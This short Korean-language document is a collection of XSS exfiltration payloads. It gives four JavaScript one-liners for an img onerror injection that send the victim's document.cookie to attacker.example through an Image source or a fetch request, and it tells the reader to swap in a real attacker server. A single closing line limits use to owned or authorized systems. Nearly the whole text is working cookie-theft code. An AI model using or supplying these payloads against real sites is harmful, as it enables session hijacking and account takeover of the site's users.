# XSS 외부 전송 페이로드

## 개요

`<img src=x onerror="...">` 형태의 XSS에서 수집한 데이터를 공격자 서버로 보내는 JavaScript 페이로드 모음이다. `attacker.example`는 실제 공격자 서버 주소로 바꿔 사용한다.

## 외부 서버로 보내기

`alert()`는 측정이 어렵다. 공격자 서버로 결과를 보내는 형태가 더 실용적이다.

```js
new Image().src='http://attacker.example/steal?c='+encodeURIComponent(document.cookie)
```

```js
fetch('http://attacker.example/steal',{method:'POST',mode:'no-cors',body:document.cookie})
```

```js
fetch('http://attacker.example/steal?data='+encodeURIComponent(encodeURIComponent(document.cookie)))
```

```js
var img=new Image();
img.onload=function(){alert('sent')}
img.src='http://attacker.example/steal?c='+encodeURIComponent(document.cookie)
```

- 모든 시도는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.